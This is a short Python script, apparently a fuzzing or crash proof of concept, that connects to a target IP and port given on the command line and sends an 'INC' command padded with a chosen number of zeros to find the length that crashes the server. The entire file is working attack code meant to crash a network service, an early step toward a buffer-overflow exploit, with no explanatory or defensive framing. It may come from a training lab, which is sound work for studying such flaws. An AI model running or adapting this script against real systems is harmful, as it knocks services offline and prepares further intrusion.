import sys
import socket

targetIP = sys.argv[1]
targetPort = int(sys.argv[2])
length = int(sys.argv[3])

try:
    print("Trying " + str(length) + " number of integers!")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((targetIP, targetPort))

    data = s.recv(1024)

    badstr = "INC " + ("0" * length) + "LOGA" + "\r\n"
    s.send(badstr.encode()) 
    data = s.recv(1024)
    s.close()
    print(str(length) + " integers was a success!")


except:
    print("Inc server has crashed!")
